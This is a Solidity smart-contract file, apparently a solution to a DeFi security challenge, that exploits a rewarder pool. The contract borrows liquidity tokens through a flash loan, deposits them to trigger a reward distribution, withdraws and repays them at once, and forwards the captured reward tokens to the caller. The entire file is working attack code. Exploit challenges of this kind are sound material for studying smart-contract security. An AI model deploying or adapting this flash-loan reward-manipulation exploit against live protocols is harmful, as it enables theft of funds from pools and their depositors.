// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract AttackerFlashLoanerReceiver {
    IERC20 public liquidityToken;
    IERC20 public rewardToken;
    IRewarderPool public rewarderPool;
    IFlashLoanerPool public flashLoanerPool;

    constructor(
        address liquidityToken_,
        address rewardToken_,
        address rewarderPool_,
        address flashLoaner_
    ) {
        liquidityToken = IERC20(liquidityToken_);
        rewardToken = IERC20(rewardToken_);
        rewarderPool = IRewarderPool(rewarderPool_);
        flashLoanerPool = IFlashLoanerPool(flashLoaner_);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);

        // This will trigger reward distribution
        rewarderPool.deposit(amount);

        // Immediately withdraw liquidity tokens
        rewarderPool.withdraw(amount);

        // Transfer withdrawn liquidity tokens back to pool
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    function initiateFlashLoan(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);

        // Send all reward token to attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
